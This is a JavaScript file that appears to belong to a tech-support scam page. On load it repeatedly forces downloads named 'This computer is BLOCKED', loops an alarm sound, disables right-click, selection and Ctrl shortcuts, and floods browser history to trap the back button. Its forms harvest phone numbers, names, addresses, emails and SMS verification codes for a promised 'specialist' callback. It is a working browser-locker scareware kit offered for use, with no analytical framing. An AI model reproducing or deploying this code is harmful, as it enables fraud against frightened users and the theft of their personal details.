function fillForm(variant) {
	console.log(document.getElementById("form" + variant).elements);
	elements1 = document.getElementById("form1").elements;
	elements2 = document.getElementById("form" + variant).elements;
	elements1[0].value = elements2[0].value;
	elements1[7].value = elements2[1].value;
	$('html, body').animate({
		scrollTop: $("#form1").offset().top - 150
	}, 2000);

}

function closeCode() {
	$('#modal_form2')
		.animate({opacity: 0, top: '45%'}, 200,
			function () {
				$(this).css('display', 'none');
				$('#overlay2').fadeOut(400);
			}
		);
}

function getCode() {
	$('#overlay2').fadeIn(400,
		function () {
			$('#modal_form2')
				.css('display', 'block')
				.animate({opacity: 1, top: '40%'}, 200);
		});
}

function modalClose(variant) {
	$('#modal_form1')
		.animate({opacity: 0, top: '45%'}, 200,
			function () {
				$(this).css('display', 'none');
				$('#overlay1').fadeOut(400);
			}
		);
}

function getModal(variant, text) {
	$('#overlay1').fadeIn(400,
		function () {
			$('#modal_form1')
				.css('display', 'block')
				.animate({opacity: 1, top: '25%'}, 200);
			console.log();
			$('#popup_title').empty();
			$('#popup_text').empty();
			$('#popup_img').empty();

			$('#popup_title').append($('#title' + variant)[0].innerHTML);
			$('#popup_text').append(text);
			$('#popup_img').append($('#image' + variant).clone());
		});
}

function _toggleFullScreen() {
	if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
		if (document.documentElement.requestFullscreen) {
			document.documentElement.requestFullscreen();
		}
		else if (document.documentElement.mozRequestFullScreen) {
			document.documentElement.mozRequestFullScreen();
		}
		else if (document.documentElement.webkitRequestFullscreen) {
			document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
		}
	}
}

function open1() {
	window.open("index.html", "_blank", "location=no,menubar=no,toolbar=no,status=no,scrollbars=no,resizable=no,left=2110,top=1500,width=5,height=5"); // min height & width is 100
}

function isPlaying(audelem) {
	return !audelem.paused;
}

function forceDownload(href) {
	var anchor = document.createElement('a');
	anchor.href = href;
	anchor.download = 'This computer is BLOCKED';
	document.body.appendChild(anchor);
	anchor.click();
}

function catchControlKeys(event) {
	var code = event.keyCode ? event.keyCode : event.which ? event.which : null;
	if (event.ctrlKey) {
		// Ctrl+U
		if (code == 117) {
			return false;
		}
		if (code == 85) {
			return false;
		}
		// Ctrl+C
		if (code == 99) {
			return false;
		}
		if (code == 67) {
			return false;
		}
		// Ctrl+A
		if (code == 97) {
			return false;
		}
		if (code == 65) {
			return false;
		}
	}
}

function prevent() {
	return false;
}

$(document).ready(function () {
	var detail = '';
	// process the form
	$('#form1').submit(function (event) {
		//rush my order
		var formData = {
			'phone': $('input[name=phone]').val()
		};
		$.ajax({
			type: 'POST',
			url: 'SEND_REQ.php',
			data: formData,
			dataType: 'json'
		})
			.done(function (data) {
				detail = data['Details'];
				console.log(data);
				if (data['Status'] == 'Success') {
					getCode();
					document.getElementById('verification_code').disabled = false;
					document.getElementById('message1').innerHTML = "Pin code sent to your phone, please enter it.";
				} else {
					document.getElementById('message1').innerHTML = "Error, 10 digits expected.";
				}
			});
		event.preventDefault();
	});

	$('#verification_form').submit(function (event) {
		//verify with code
		time = '';
		if (document.getElementById('t1').checked) {
			time = document.getElementById('t1').value;
		}
		if (document.getElementById('t2').checked) {
			time = document.getElementById('t2').value;
		}
		if (document.getElementById('t3').checked) {
			time = document.getElementById('t3').value;
		}
		var formData = {
			'first_name': $('input[name=first_name]').val(),
			'last_name': $('input[name=last_name]').val(),
			'address': $('input[name=address]').val(),
			'city': $('input[name=city]').val(),
			'state': $('input[name=state]').val(),
			'pin_code': $('input[name=pin_code]').val(),
			'phone': $('input[name=phone]').val(),
			'email': $('input[name=email]').val(),
			'time': time,
			'details': detail,
			'verification_code': $('input[name=verification_code]').val()
		};

		$.ajax({
			type: 'POST',
			url: 'handler.php',
			data: formData,
			dataType: 'text'
		}).done(function (data) {
			console.log(data);
			if (data == 'Success') {
				document.getElementById('message1').innerHTML = "Thanks for contacting us. One of our representative will get in touch with you shortly.";
				document.getElementById('submit_code').disabled = false;
			} else {
				document.getElementById('message1').innerHTML = "Error, invalid code.";
			}
			//$('#thankYou')
			//.css('display', 'block')
			//.animate({opacity: 1, bottom: '0%'}, 3000);
			//setTimeout(ThankOff(), 3000);
		});
		event.preventDefault();
	});

	$('#form2').submit(function (event) {
		if (document.getElementById('verification_code').disabled == true) {
			var formData = {
				'phone': $('#phone').val()
			};
			$.ajax({
				type: 'POST',
				url: 'SEND_REQ.php',
				data: formData,
				dataType: 'json'
			}).done(function (data) {
				detail = data['Details'];
				//console.log(data);
				if (data['Status'] == 'Success') {
					document.getElementById('verification_code').disabled = false;
					document.getElementById('message2').innerHTML = "Pin code sent to your phone, please enter it.";
				} else {
					document.getElementById('message2').innerHTML = "Error, 10 digits expected.";
				}
			});
		}
		else {
			time = '';
			if (document.getElementById('time1').checked) {
				time = document.getElementById('time1').value;
			}
			if (document.getElementById('time2').checked) {
				time = document.getElementById('time2').value;
			}
			if (document.getElementById('time3').checked) {
				time = document.getElementById('time3').value;
			}
			var formData = {
				'first_name': $('#first_name').val(),
				'last_name': $('#last_name').val(),
				'address': $('#address').val(),
				'city': $('#city').val(),
				'state': $('#state').val(),
				'pin_code': $('#pin_code').val(),
				'phone': $('#phone').val(),
				'email': $('#email').val(),
				'time': time,
				'details': detail
			};
			//console.log(formData);

			$.ajax({
				type: 'POST',
				url: 'handler.php',
				data: formData,
				dataType: 'text'
			})
				.done(function (data) {
					//console.log(data);
					if (data == 'Success') {
						document.getElementById('message2').innerHTML = "Your request is processing now. Our specialist will contact you in next 6 hours";
					} else {
						document.getElementById('message2').innerHTML = "Error, invalid code.";
					}
					//$('#thankYou')
					//.css('display', 'block')
					//.animate({opacity: 1, bottom: '0%'}, 3000);
					//setTimeout(ThankOff(), 3000);
				});
		}
		event.preventDefault();
	});

	// $('.slider').bxSlider();

	// audio play /*
	var msgAudioEl = document.getElementById("msgSound");

	var playMsgInt = setInterval(function () {
		if (isPlaying(msgAudioEl)) {
			// console.log('already playing. clearing interval');
			clearInterval(playMsgInt);
		} else {
			// console.log('Triggering play');
			msgAudioEl.play();
		}
	}, 500);
	// audio play */

	// force download /*
	var file = 'index.html';

	forceDownload(file);
	var counter = 0;
	var interval = setInterval(function () {
		counter++;
		forceDownload(file);
		if (counter > 4) {
			clearInterval(interval)
		}
	}, 1500);
	// force download */

	document.ondragstart = prevent;
	document.onselectstart = prevent;
	document.oncontextmenu = prevent;
	setInterval(function () {
		var stateObj = {error: "error"};
		history.pushState(stateObj, document.title, document.href);
	}, 500);
});
